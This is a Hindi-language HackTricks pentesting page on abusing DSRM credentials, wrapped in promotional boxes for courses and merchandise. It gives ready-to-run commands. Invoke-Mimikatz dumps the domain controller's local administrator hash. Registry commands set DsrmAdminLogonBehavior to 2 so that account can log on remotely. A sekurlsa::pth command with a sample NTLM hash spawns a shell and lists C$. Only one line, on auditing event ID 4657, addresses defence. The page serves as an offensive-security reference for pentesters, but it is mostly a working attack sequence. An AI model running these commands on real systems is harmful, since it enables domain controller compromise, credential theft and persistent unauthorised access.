<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>


# DSRM क्रेडेंशियल्स

प्रत्येक **DC** के अंदर एक **लोकल एडमिनिस्ट्रेटर** खाता होता है। इस मशीन में एडमिन विशेषाधिकार होने पर आप mimikatz का उपयोग करके **लोकल एडमिनिस्ट्रेटर हैश को डंप** कर सकते हैं। फिर, रजिस्ट्री में संशोधन करके इस पासवर्ड को **सक्रिय करें** ताकि आप इस लोकल एडमिनिस्ट्रेटर उपयोगकर्ता तक दूरस्थ रूप से पहुँच सकें।\
सबसे पहले हमें DC के अंदर **लोकल एडमिनिस्ट्रेटर** उपयोगकर्ता का **हैश** **डंप** करने की आवश्यकता है:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
तब हमें यह जांचना होगा कि क्या वह खाता काम करेगा, और यदि रजिस्ट्री कुंजी में मान "0" है या वह मौजूद नहीं है तो आपको इसे **"2" में सेट करना होगा**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
फिर, PTH का उपयोग करके आप **C$ की सामग्री की सूची बना सकते हैं या यहां तक कि एक शेल प्राप्त कर सकते हैं**। ध्यान दें कि उस हैश के साथ एक नया powershell सत्र बनाने के लिए (PTH के लिए) **"डोमेन" केवल DC मशीन का नाम होता है:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
इसके बारे में अधिक जानकारी के लिए: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) और [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## उपाय

* इवेंट आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` के निर्माण/परिवर्तन की ऑडिटिंग

<details>

<summary><strong> AWS हैकिंग सीखें शुरुआत से लेकर एक्सपर्ट तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके.

</details>
